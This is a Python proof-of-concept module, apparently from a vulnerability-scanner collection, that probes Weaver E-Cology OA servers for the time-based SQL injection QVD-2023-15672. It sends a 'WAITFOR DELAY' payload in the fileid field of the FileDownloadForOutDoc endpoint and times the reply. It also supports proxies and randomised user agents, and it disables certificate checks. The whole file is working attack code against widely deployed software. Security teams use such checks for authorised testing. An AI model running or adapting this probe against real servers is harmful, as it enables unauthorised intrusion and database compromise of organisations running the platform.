import requests
import random
import time
from fake_useragent import UserAgent


def get_info():
    return {
        "Name": "泛微E-Cology SQL注入（QVD-2023-15672）",
        "Attack": False,
        "Script": "QVD-2023-15672.py",
        "Path": "pocs/泛微OA/QVD-2023-15672.py",
        "version": "Ecology 9.x 补丁版本 < 10.58.0,Ecology 8.x 补丁版本 < 10.58.0",
        "about": "泛微协同管理应用平台e-cology是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台。",
        "CVE": "QVD-2023-15672.py"
    }


def verify(url, proxy, ug):
    ua = UserAgent()  # 实例化随机useragent对象
    useragent = ua.chrome  # 随机生成谷歌的useragent头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    if ug:
        headers = {
            'User-Agent': useragent,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    proxies = None
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
    # print(proxies)
    result = {
        'Name': '泛微E-Cology SQL注入',
        'Script': 'QVD-2023-15672.py',
        'url': url,
        'Attack': False,
        'vulnerable': False
    }

    if url.endswith('/'):
        url = url[:-1]

    url = url + "/weaver/weaver.file.FileDownloadForOutDoc"
    data = random.randint(8888888888, 9999999999999999)
    data_1000 = {
        'isFromOutImg': '1',
        'fileid': str(data)
    }
    data += 1
    data_delay = {
        'isFromOutImg': '1',
        'fileid': f"{data} WAITFOR DELAY '0:0:10'"
    }

    try:
        # First request with fileid=1000
        start_time_1000 = time.time()
        response_1000 = requests.post(url, headers=headers, data=data_1000, timeout=10, verify=False, proxies=proxies)
        end_time_1000 = time.time()
        # print(response_1000)

        # Second request with fileid="10000WAITFOR DELAY+'0:0:10'"
        start_time_delay = time.time()
        response_delay = requests.post(url, headers=headers, data=data_delay, verify=False, proxies=proxies)
        end_time_delay = time.time()

        response_time_delay = end_time_delay - start_time_delay
        # print(response_delay.text)
        if response_1000.status_code == 200 and response_time_delay > 10 and "Not" not in response_1000.text:
            result['vulnerable'] = True
            result['verify'] = f"{url}"
            return result
        else:
            return result

    except requests.exceptions.RequestException as e:
        return result


if __name__ == '__main__':
    pass
